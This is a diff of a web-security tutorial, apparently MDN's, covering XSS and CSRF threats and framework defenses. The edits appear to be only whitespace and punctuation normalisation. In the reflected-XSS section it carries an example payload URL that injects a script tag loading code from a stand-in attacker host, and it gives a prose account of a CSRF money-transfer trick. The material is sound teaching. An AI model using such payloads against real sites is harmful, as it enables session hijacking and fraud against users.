@@ -38,7 +38,7 @@ The Internet is a dangerous place! With great regularity, we hear about websites
 
 The purpose of website security is to prevent these (or any) sorts of attacks. The more formal definition of website security _is the act/practice of protecting websites from unauthorized access, use, modification, destruction, or disruption_.
 
-Effective website security requires design effort across the whole of the website: in your web application, the configuration of the web server, your policies for creating and renewing passwords, and the client-side code. While all that sounds very ominous, the good news is that if you're using a server-side web framework, it will almost certainly enable "by default" robust and well-thought-out defense mechanisms against a number of the more common attacks. Other attacks can be mitigated through your web server configuration, for example by enabling HTTPS. Finally, there are publicly available vulnerability scanner tools that can help you find out if you've made any obvious mistakes.
+Effective website security requires design effort across the whole of the website: in your web application, the configuration of the web server, your policies for creating and renewing passwords, and the client-side code. While all that sounds very ominous, the good news is that if you're using a server-side web framework, it will almost certainly enable "by default" robust and well-thought-out defense mechanisms against a number of the more common attacks. Other attacks can be mitigated through your web server configuration, for example by enabling HTTPS. Finally, there are publicly available vulnerability scanner tools that can help you find out if you've made any obvious mistakes.
 
 The rest of this article gives you more details about a few common threats and some of the simple steps you can take to protect your site.
 
@@ -50,16 +50,16 @@ This section lists just a few of the most common website threats and how they ar
 
 ### Cross-Site Scripting (XSS)
 
-XSS is a term used to describe a class of attacks that allow an attacker to inject client-side scripts _through_ the website into the browsers of other users. Because the injected code comes to the browser from the site, the code is _trusted_ and can do things like send the user's site authorization cookie to the attacker. When the attacker has the cookie, they can log into a site as though they were the user and do anything the user can, such as access their credit card details, see contact details, or change passwords.
+XSS is a term used to describe a class of attacks that allow an attacker to inject client-side scripts _through_ the website into the browsers of other users. Because the injected code comes to the browser from the site, the code is _trusted_ and can do things like send the user's site authorization cookie to the attacker. When the attacker has the cookie, they can log into a site as though they were the user and do anything the user can, such as access their credit card details, see contact details, or change passwords.
 
 > **Note:** XSS vulnerabilities have been historically more common than any other type of security threat.
 
 The XSS vulnerabilities are divided into _reflected_ and _persistent_, based on how the site returns the injected scripts to a browser.
 
 - A _reflected_ XSS vulnerability occurs when user content that is passed to the server is returned _immediately_ and _unmodified_ for display in the browser. Any scripts in the original user content will be run when the new page is loaded.
-  For example, consider a site search function where the search terms are encoded as URL parameters, and these terms are displayed along with the results. An attacker can construct a search link that contains a malicious script as a parameter (e.g., `http://mysite.com?q=beer<script%20src="http://evilsite.com/tricky.js"></script>`) and email it to another user. If the target user clicks this "interesting link", the script will be executed when the search results are displayed. As discussed earlier, this gives the attacker all the information they need to enter the site as the target user, potentially making purchases as the user or sharing their contact information.
+  For example, consider a site search function where the search terms are encoded as URL parameters, and these terms are displayed along with the results. An attacker can construct a search link that contains a malicious script as a parameter (e.g., `http://mysite.com?q=beer<script%20src="http://evilsite.com/tricky.js"></script>`) and email it to another user. If the target user clicks this "interesting link", the script will be executed when the search results are displayed. As discussed earlier, this gives the attacker all the information they need to enter the site as the target user, potentially making purchases as the user or sharing their contact information.
 - A _persistent_ XSS vulnerability occurs when the malicious script is _stored_ on the website and then later redisplayed unmodified for other users to execute unwittingly.
-  For example, a discussion board that accepts comments that contain unmodified HTML could store a malicious script from an attacker. When the comments are displayed, the script is executed and can send to the attacker the information required to access the user's account. This sort of attack is extremely popular and powerful, because the attacker might not even have any direct engagement with the victims.
+  For example, a discussion board that accepts comments that contain unmodified HTML could store a malicious script from an attacker. When the comments are displayed, the script is executed and can send to the attacker the information required to access the user's account. This sort of attack is extremely popular and powerful, because the attacker might not even have any direct engagement with the victims.
 
 While the data from `POST` or `GET` requests is the most common source of XSS vulnerabilities, any data from the browser is potentially vulnerable, such as cookie data rendered by the browser, or user files that are uploaded and displayed.
 
@@ -103,21 +103,21 @@ Web frameworks will often take care of the character escaping for you. Django, f
 
 ### Cross-Site Request Forgery (CSRF)
 
-CSRF attacks allow a malicious user to execute actions using the credentials of another user without that user’s knowledge or consent.
+CSRF attacks allow a malicious user to execute actions using the credentials of another user without that user's knowledge or consent.
 
 This type of attack is best explained by example. John is a malicious user who knows that a particular site allows logged-in users to send money to a specified account using an HTTP `POST` request that includes the account name and an amount of money. John constructs a form that includes his bank details and an amount of money as hidden fields, and emails it to other site users (with the _Submit_ button disguised as a link to a "get rich quick" site).
 
-If a user clicks the submit button, an HTTP `POST` request will be sent to the server containing the transaction details and any client-side cookies that the browser associated with the site (adding associated site cookies to requests is normal browser behavior). The server will check the cookies, and use them to determine whether or not the user is logged in and has permission to make the transaction.
+If a user clicks the submit button, an HTTP `POST` request will be sent to the server containing the transaction details and any client-side cookies that the browser associated with the site (adding associated site cookies to requests is normal browser behavior). The server will check the cookies, and use them to determine whether or not the user is logged in and has permission to make the transaction.
 
-The result is that any user who clicks the _Submit_ button while they are logged in to the trading site will make the transaction. John gets rich.
+The result is that any user who clicks the _Submit_ button while they are logged in to the trading site will make the transaction. John gets rich.
 
-> **Note:** The trick here is that John doesn't need to have access to the user's cookies (or access credentials). The browser of the user stores this information and automatically includes it in all requests to the associated server.
+> **Note:** The trick here is that John doesn't need to have access to the user's cookies (or access credentials). The browser of the user stores this information and automatically includes it in all requests to the associated server.
 
 One way to prevent this type of attack is for the server to require that `POST` requests include a user-specific site-generated secret. The secret would be supplied by the server when sending the web form used to make transfers. This approach prevents John from creating his own form, because he would have to know the secret that the server is providing for the user. Even if he found out the secret and created a form for a particular user, he would no longer be able to use that same form to attack every user.
 
 Web frameworks often include such CSRF prevention mechanisms.
 
-### Other threats
+### Other threats
 
 Other common attacks/vulnerabilities include:
 
